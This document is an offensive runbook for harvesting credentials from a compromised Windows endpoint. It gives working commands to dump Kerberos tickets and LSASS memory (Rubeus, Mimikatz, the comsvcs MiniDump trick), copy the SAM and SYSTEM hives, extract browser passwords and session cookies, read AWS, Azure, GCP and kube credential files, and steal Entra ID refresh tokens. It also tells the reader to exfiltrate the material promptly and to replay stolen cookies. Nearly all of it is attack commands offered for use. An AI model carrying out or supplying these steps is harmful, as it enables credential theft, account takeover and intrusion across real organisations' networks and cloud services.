# Runbook: Credential and token harvesting

## Objective

Extract all credential material available from the compromised endpoint: Windows hashes and Kerberos tickets, browser-stored passwords and session cookies, cloud CLI tokens, and SSO state. This material is what converts a single endpoint compromise into access to the broader environment.

## Windows credential material

### Kerberos tickets

Extract tickets from LSASS memory without direct process access, using Rubeus:

```powershell
# Load Rubeus in memory (via execute-assembly or AMSI-bypassed PowerShell)
.\Rubeus.exe dump /nowrap
# Exports all tickets in base64 format for import elsewhere

# Or harvest a TGT for the current user
.\Rubeus.exe tgtdeleg /nowrap
```

Import a captured TGT on the attacker's Linux host:

```bash
# Convert base64 ticket to .ccache format
echo "<base64-ticket>" | base64 -d > ticket.kirbi
python3 ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
# Use with Impacket tools
smbclient.py -k -no-pass domain/user@target
```

### NTLM hashes

```powershell
# Via Mimikatz sekurlsa (requires SeDebugPrivilege, heavily monitored)
privilege::debug
sekurlsa::logonpasswords

# Via comsvcs.dll MiniDump (abuses a signed binary)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass-PID> C:\Windows\Temp\lsass.dmp full

# Extract hashes from the dump on the attacker machine
pypykatz lsa minidump lsass.dmp
```

### SAM and LSA secrets

```bash
# Via Volume Shadow Copy (no process access needed)
vssadmin create shadow /for=C:
# Copy SAM, SYSTEM, SECURITY from the shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM

# Extract on attacker machine
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

## Browser credentials and session cookies

```python
# SharpChrome extracts Chrome/Edge credentials in memory
execute-assembly SharpChrome.exe logins
execute-assembly SharpChrome.exe cookies

# LaZagne covers multiple browsers and credential stores
execute-assembly LaZagne.exe browsers
```

Captured cookies for active SaaS sessions: export the relevant cookies (particularly session, auth, and CSRF tokens) and import them into an attacker-controlled browser instance:

```bash
# Using cookie-editor browser extension or EditThisCookie, import the JSON array
# Verify session validity before ending the engagement window
curl -H "Cookie: session=<value>" https://app.target.com/api/user/me
```

## Cloud CLI tokens

```powershell
# AWS credentials
type %USERPROFILE%\.aws\credentials
type %USERPROFILE%\.aws\config

# Azure CLI cached tokens
dir %USERPROFILE%\.azure\

# Google Cloud
dir %APPDATA%\gcloud\

# kubectl configuration (cluster credentials)
type %USERPROFILE%\.kube\config
```

Exfiltrate these files. Test each set of cloud credentials immediately to confirm validity before the session ages out:

```bash
aws sts get-caller-identity
az account show
gcloud auth list
```

## Entra ID Primary Refresh Token

```powershell
# Extract PRT using ROADtoken (requires running in the user's context)
execute-assembly ROADtoken.exe

# Or use AADInternals from a PowerShell session
Import-Module AADInternals
$prt = Get-AADIntUserPRTToken
```

Use the PRT to obtain access tokens for any Entra ID-protected resource:

```powershell
$token = Get-AADIntAccessTokenForMSGraph -PRTToken $prt
# Access Microsoft Graph, SharePoint, Teams, Exchange as the user
```

## Prioritisation

Collect in this order: Kerberos TGTs first (they expire), then cloud tokens (may have short lifetimes), then browser session cookies (session-bound, may expire on browser close), then password hashes (durable, offline crackable). Exfiltrate material promptly; waiting reduces value as sessions expire.
